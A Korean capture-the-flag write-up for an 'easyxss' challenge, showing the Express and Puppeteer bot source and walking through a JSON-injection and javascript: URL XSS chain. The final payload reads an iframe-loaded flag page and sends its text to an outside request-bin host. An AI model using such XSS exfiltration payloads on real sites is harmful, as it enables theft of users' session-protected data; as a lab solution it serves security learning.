## easyxss
---

+ index.js

```javascript
const parse = require('url-parse');
const express = require('express');
const bot = require('./bot');
const router = express();

router.get('/', (req, res) => {
    const blog = req.query.blog || 'https://pocas.kr';
    const user = JSON.parse(`{"username":"Tester", "setblog":"${blog}"}`);
    const url = parse(user['setblog'], true)
    , hostname = url.hostname;

    if ((hostname === 'web-noob.kr' && user['username'] === 'hello') || (hostname === 'web-noob.kr' && username === 'world')) {
        console.log(1)
        res.render('index', {url:url});
    } else {
        res.render('index', {url:'#'});
    }
});

router.get('/flag', (req, res) => {
    const session = req.cookies.jsession || undefined;
    if (session === 'DELETE') {
        result = 'pocas{fakeflag}';
    } else {
        result = 'You are not admin';
    }
    res.render('flag', {result:result});
});

router.get('/report', (req, res) => {
    res.render('report.ejs');
});

router.post('/report', (req, res) => {
    try{
        bot(req.body.pay);
        res.send('<script>alert("Good Report!");history.go(-1);</script>');
    } catch (err) {
        res.send('<script>alert("Internal Server Error!");history.go(-1);</script>');
    }
});

module.exports = router;
```

<br>

+ bot.js

```javascript
const puppeteer = require('puppeteer');
const parse = require('url-parse');

const cookies = [{
    name: 'jsession',
    value: 'DELETE',
    domain: "127.0.0.1",
    httpOnly:true
}];

const bot = async function (url){
    const URL = parse(url, true)
    try{
        const browser = await puppeteer.launch({
            headless: true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage'
            ],
            dumpio: true,
        });
        page = await browser.newPage('http://127.0.0.1:80');
        await page.setCookie(...cookies);

        console.log(URL.href)
        await page.goto(`http://127.0.0.1:80/?blog=${URL.href}`);
        setTimeout(() => {
            browser.close();
        }, 4000);
    } catch (err) {
        console.log(`err : ${err}`);
    }
}

module.exports = bot;
```

<br><br>

## Solution
---

플래그 부분을 보면 jsession 쿠키가 DELETE 값을 가지면 플래그를 보여준다.

그래서 그냥 해봤지만 역시 안됬고, bot.js 파일을 보면 거기서 쿠키를 세팅하는 것을 알 수 있다.

그래서 bot을 이용해서 접근을 해야한다 생각했다. (나중에 생각남..)

<br>

bot을 보면 blog 파라미터에 값을 설정해서 보내는 것을 확인할 수 있는데, 코드를 보면 JSON 값을 parse 한 뒤, ```user['username']```과 ```hostname```을 확인하여 조건을 만족하면 url 값을 보낸다.

이 부분은 다음과 같이 설정할 수 있다. ----> ```javascript://web-noob.kr","username":"hello```

<br>

그 다음이 문제다.. 이제 뭘 해야 하는가?

엄청난 시도를 통해 자바스크립트 코드를 실행을 하게 되었다.

<br>

```javascript://web-noob.kr//%0aalert(1);","username":"hello``` ----> alert(1) 실행

<br>

여기까지는 OK.. 이제 플래그 페이지 안에 있는 플래그를 읽어야 하는데.. 여기서 너무나 오래 걸렸다..

어떻게 읽어서 보내는가?

오랜 시간 문제를 풀다보니 머리가 어떻게 된건지 생각이 나지 않았다..

<br>

방법은 iframe을 생성해서 flag 페이지를 불러온 뒤 그 안에 있는 p태그의 값을 불러와서 서버로 보내주면 되는 것이다.

우선 프레임이 생성되는지 확인을 해야 한다.

<br>

```javascript://web-noob.kr//%250aconst%20a=document.createElement`iframe`;a.src=%27/flag%27;document.body.appendChild(a);","username":"hello```

<br>

프레임까지는 생성이 된다.

그래서 이제 프레임 속 값만 가져오면 되니까 행복회로 돌리면서 먼저 콘솔 창에서 확인해보았다.

<br>

```document.querySelector('iframe').contentWindow.document.body.querySelector('p').innerHTML```

<br>

ㅋㅋ 이제 이걸 location.href로 서버로 보내면 값이 나올꺼라 생각하며 보냈는데? null이 뜬다고 한다..

하.. 여기서 중요한 사실을 깨달았다.

빨리 자바스크립트 공부를 해야 한다.. 자바스크립트는 비동기 방식이라고 한다.

비동기 방식은 코드가 실행되고 결과 값을 받아오기까지를 기다리지 않는 거라고 한다.

그래서 아마 iframe이 실행되고 코드를 가져오기 전에 위의 코드가 실행되므로 innerHTML으로 받아와버려서 값이 없는 것이였다.

따라서 다 받아온 뒤에 하기로 했다.

<br>

```%22,%22username%22:%22hello%22,%22setblog%22:%22javascript://web-noob.kr/%250alet%20a=document.createElement('iframe');a.setAttribute('src','/flag');document.body.appendChild(a);setTimeout(function(){let%20c=document.querySelector('iframe').contentWindow.document.querySelector('.center p').innerText;location.href='http://kfwsgjw.request.dreamhack.games/?data=%27.concat(c)%7D,3000)```

<br>

setTimeout으로 좀 늦춘 다음에 코드를 실행시켜서 iframe이 다 받아온 다음에 읽어서 보냈다.

ㅇㅋ ```You are not admin!```이 왔다.

따라서 이제 report에서 값을 보내주면 쿠키가 생성된 다음 로컬호스트가 flag로 간 다음 플래그가 있는 p 태그의 값을 읽어서 서버로 보내줄 것이다!!

휴.. 


